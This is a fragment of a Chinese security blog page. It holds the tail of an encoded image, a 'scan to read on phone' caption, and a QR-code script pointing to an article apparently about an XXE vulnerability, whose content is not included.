SD1oSOlubZcM6lZsRXNNE/067/ZEV84/eewDoQtieCzT/bXiac3ByH/1mk132ljtZm7cK5jtZwxNKPNtc+i+l+o4YjN+Zf9deBvFpw6/7sCax/fh+flvKfLcvrTwOva+c16VrMqTXG8n6BlZudej1lI4+lbuRmv2rKaG35o9E85tKlN3Z4EJ0Q9w05OZTvpO6BPD39v5+8/Ng7Xs342d4c01cz/IipoTWJC6Mrf7TwI4758sfc7Fe+LDy9duLCyo9Ga0buZ/zqeWZjj+TDJR7xviE5nTfB9U2dfkJ4HefXwLF21owxe31y7HkkdUCsb5yH5ERwrR2f0vi0PnHa0XziEXk9x1F735DxNN/AXweSp+AVnPf9Sk009FOBuc3638uTSE1huBkrF5tzcxxd4ZxLjMONY+MQ6SlW77LT5A8SyxqlK6Nj3H9c/Hizr/WGZF9s02LvR/MVpHuNtfV0lIWjNcWV0THb//c0a9k0tB/NjHSerR/NzdqzuPZUdpaj+7DHUVu1ZeFobXGxw0AivvF7TuAeyPec++Wqv2Ug9NXjiJcrPxK0/uEu37m2S/D4kbiQ1pZf9kgv3+XPtiQeP+iah3v5ndoIEo+YHL/WL32CWYPui/tN/ePNvn7LDXn2mujpR5On4gzZa1NTGD3XGva51FT9bLSWxuTpmA2TewXpumdrz32iLfzjA5kXv+PnJ3AYSE3pyq5aXemLn2voJwhrCrtflNbEE6d6l42SisvCse9buSvjWpt+zzB9o6H7sWFyz7SHgaToxu85gXUgbJPkuf/KVuke0eapGHHOsa+hYzZMPc2lRyHNRROk+dLMxnVu1iZO38Rn+EzDfs1oC9eBnDW9ub9/AvdA/v6ZP13x/wAAAP//F/ejNgAAAAZJREFUAwAZMrqSvLf23wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 